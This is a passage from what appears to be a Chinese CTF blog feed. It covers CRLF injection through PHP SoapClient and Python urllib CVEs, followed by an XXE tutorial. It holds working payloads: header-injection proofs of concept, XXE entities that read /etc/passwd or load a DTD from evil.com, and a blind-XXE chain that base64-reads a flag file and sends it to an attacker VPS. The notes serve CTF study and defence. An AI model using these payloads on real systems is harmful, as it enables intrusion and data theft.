<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">128</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=47.xxx.xxx.72:4000%0d%0aSet-Cookie: <span class="hljs-attribute">PHPSESSID</span>=whoami<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72:4000%0d%0aSet-Cookie: PHPSESSID=whoami<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Close<br></code></pre></td></tr></table></figure><h5 id="php-soapclient-类"><a class="markdownIt-Anchor" href="#php-soapclient-类"></a> PHP SoapClient 类</h5><p>默认是发送post请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://47.xxx.xxx.72:4000/&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;WHOAMI\r\nSet-Cookie: PHPSESSID=whoami&quot;</span>, <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;test&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72:4000<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>WHOAMI%0d%0aSet-Cookie: PHPSESSID=whoami<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml; charset=utf-8<br><span class="hljs-attribute">SOAPAction</span><span class="hljs-punctuation">: </span>&quot;test#a&quot;<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>365<br></code></pre></td></tr></table></figure><p>发送post数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://47.xxx.xxx.72:4000/&#x27;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&#x27;data=whoami&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span><br>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;WHOAMI^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="pythoncrlf攻击"><a class="markdownIt-Anchor" href="#pythoncrlf攻击"></a> Python–CRLF攻击</h4><p>urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容</p><p><a href="http://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">http://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF注入漏洞小结/</a></p><h5 id="cve-2016-5699"><a class="markdownIt-Anchor" href="#cve-2016-5699"></a> CVE-2016-5699</h5><p>影响版本：urllib2 and urllib in CPython (aka Python) before 2.7.10 and 3.x before 3.4.4</p><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.10.10.10</span>\r\nx-injected: header\r\ntest:<span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.request<br><br>url = sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">try</span>:<br>    info = urllib.request.urlopen(url).info()<br>    <span class="hljs-built_in">print</span>(info)<br><span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h5 id="cve-2019-9740"><a class="markdownIt-Anchor" href="#cve-2019-9740"></a> CVE-2019-9740</h5><p>影响版本：urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><p>正常访问URL：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/test/</span>?test=a<br></code></pre></td></tr></table></figure><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面，但是和前者的区别在于注入新的端口：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.10.10.10:1234</span>?a=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\nX-injected: header\r\nTEST: <span class="hljs-number">123</span>:<span class="hljs-number">8080</span>/test/?test=a<br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> urllib.error<br><span class="hljs-keyword">import</span> urllib.request<br><br>host = <span class="hljs-string">&quot;192.168.10.137:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123&quot;</span><br>url = <span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:8080/test/?test=a&quot;</span><br><br><span class="hljs-keyword">try</span>:<br>    info = urllib.request.urlopen(url).info()<br>    <span class="hljs-built_in">print</span>(info)<br><span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h5 id="cve-2019-9947"><a class="markdownIt-Anchor" href="#cve-2019-9947"></a> CVE-2019-9947</h5><p>影响版本:urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><p>CRLF注入，注入点在端口号后面：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/?q=HTTP/</span><span class="hljs-number">1.1</span>\r\nHeader: Value\r\nHeader2: \r\n<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/HTTP/</span><span class="hljs-number">1.1</span>\r\nHeader: Value\r\nHeader2: \r\n<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<br><br>urllib.request.urlopen(<span class="hljs-string">&#x27;http://192.168.10.137:7777/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n&#x27;</span>)<br><span class="hljs-comment"># 或者</span><br><span class="hljs-comment">#urllib.request.urlopen(&#x27;http://192.168.10.137:7777/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n&#x27;)</span><br></code></pre></td></tr></table></figure><h3 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h3><p>过滤掉<code>\r\n</code></p><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> <em>参考资料</em></h3><p><a href="https://xz.aliyun.com/t/12387?time__1311=mqmhD57KAKGIzDBqDTeeqBKM3ctmhP6xx&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F">https://xz.aliyun.com/t/12387?time__1311=mqmhD57KAKGIzDBqDTeeqBKM3ctmhP6xx&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p><p><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF Injection漏洞的利用与实例分析.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XML实体注入</title>
    <link href="/2024/02/23/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/02/23/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="基础介绍"><a class="markdownIt-Anchor" href="#基础介绍"></a> 基础介绍</h3><p>XML用于标记电子文件使其<strong>具有结构性的标记语言</strong>，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言</p><h4 id="xml文档结构"><a class="markdownIt-Anchor" href="#xml文档结构"></a> XML文档结构</h4><ul><li><p>XML声明：<code>&lt;?xml version=&quot;1.0&quot;&gt;</code></p></li><li><p>DTD文档类型定义</p></li><li><p>文档元素</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span> <span class="hljs-comment">&lt;!--XML声明--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">bodys</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span>  (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">heading</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">bodys</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><span class="hljs-comment">&lt;!--文档类型定义--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>北京<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>石家庄<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>wintrysec<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bodys</span>&gt;</span>wintrysec.github.io<span class="hljs-tag">&lt;/<span class="hljs-name">bodys</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br></code></pre></td></tr></table></figure><h4 id="优点"><a class="markdownIt-Anchor" href="#优点"></a> 优点</h4><p>可以用于传输数据，可以跨越互联网任何的平台，不受编程语言和操作系统的限制，非常适合Web传输，而且xml有助于在服务器之间穿梭结构化数据，方便开发人员控制数据的存储和传输，。</p><h4 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h4><ul><li>配置应用程序和网站</li><li>数据交互</li></ul><h4 id="语法"><a class="markdownIt-Anchor" href="#语法"></a> 语法</h4><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-comment">&lt;!--内部声明DTD--&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--引用外部DTD--&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> “文件名”&gt;</span> 或<span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">PUBLIC</span> “public_ID” “文件名”&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--内部声明实体--&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 “实体的值<span class="hljs-string">&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">&lt;!--引用外部实体--&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">&lt;!ENTITY 实体名称 SYSTEM “URI&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--或者--&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-keyword">PUBLIC</span> “public_ID<span class="hljs-string">&quot; “URI&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="php中存在xxe的类"><a class="markdownIt-Anchor" href="#php中存在xxe的类"></a> php中存在XXE的类</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml_class</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$xml</span>,LIBXML_NOENT);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$xml_class</span>);<br></code></pre></td></tr></table></figure><p>修复：禁止加载XML实体对象的方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">//修复</span><br><span class="hljs-variable">$xml_class</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$xml</span>,LIBXML_NOENT);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$xml_class</span>);<br></code></pre></td></tr></table></figure><h3 id="xml外部实体注入xxe"><a class="markdownIt-Anchor" href="#xml外部实体注入xxe"></a> XML外部实体注入（XXE）</h3><p>注入的位置在DTD部分</p><h4 id="本地引入"><a class="markdownIt-Anchor" href="#本地引入"></a> 本地引入</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span> <span class="hljs-comment">&lt;!--XML声明--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE x[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">wintrysec</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><span class="hljs-comment">&lt;!--文档类型定义--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;wintrysec;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br></code></pre></td></tr></table></figure><p>文档元素位置是为了限制回显所写的地方，文档元素标签是什么要根据题目修改</p><h4 id="远程引入"><a class="markdownIt-Anchor" href="#远程引入"></a> 远程引入</h4><h5 id="方法一"><a class="markdownIt-Anchor" href="#方法一"></a> 方法一</h5><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span> <span class="hljs-comment">&lt;!--XML声明--&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE x[</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY %d <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://evil.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%d;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span><span class="hljs-comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;wintrysec;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><span class="hljs-comment">&lt;!--文档元素--&gt;</span></span><br></code></pre></td></tr></table></figure><p>远程文件evil.dtd的内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">wintrysec</span> <span class="hljs-keyword">SYSTEM</span> “file:///etc/passwd<span class="hljs-string">&quot;&gt;</span></span><br></code></pre></td></tr></table></figure><h5 id="方法二"><a class="markdownIt-Anchor" href="#方法二"></a> 方法二</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE x <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://evil.com/evil.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;wintrysec;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="无回显xxeblind-xxe"><a class="markdownIt-Anchor" href="#无回显xxeblind-xxe"></a> 无回显XXE（blind xxe）</h4><p>可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器</p><p>后端xml.php 例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br></code></pre></td></tr></table></figure><p>vps上在网站根目录写xml.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br>    <span class="hljs-variable">$myFile</span> = <span class="hljs-string">&quot;flag.txt&quot;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$myFile</span>, <span class="hljs-variable">$content</span>, FILE_APPEND);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>vps上写eval.dtd，并用python -m http.server 8000 开发访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps/index.php?q=%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><p>不是php的话写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps/index.php?q=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/eval.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>xxe lab</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql提权</title>
    <link href="/2024/02/05/mysql%E6%8F%90%E6%9D%83/"/>
    <url>/2024/02/05/mysql%E6%8F%90%E6%9D%83/</url>
    
